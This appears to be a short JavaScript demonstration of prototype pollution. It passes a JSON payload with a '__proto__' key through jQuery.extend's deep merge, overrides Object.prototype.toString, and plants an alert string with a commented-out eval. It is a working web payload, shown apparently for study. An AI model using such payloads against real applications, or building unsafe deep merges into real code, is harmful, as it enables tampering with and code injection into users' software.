let a = { b: 1, c: 2 }
console.log("a",a)


jQuery.extend(true, {}, JSON.parse('{"__proto__": {"test": true}}'));
console.log({}.toString())
console.log({});
console.dir({})
console.log("test" in {}); // trues
console.dir({})
Object.prototype.toString = function () { return "Youve been hacked" };
// jQuery.extend(true, {}, JSON.parse('{"__proto__": {"toString": null}}'));
jQuery.extend(true, {}, JSON.parse('{"__proto__": {"test": "alert(\'youve been hacked\')"}}'));
console.log({}.toString());
// console.log(eval({}.test)); alert...

console.log("a", a);

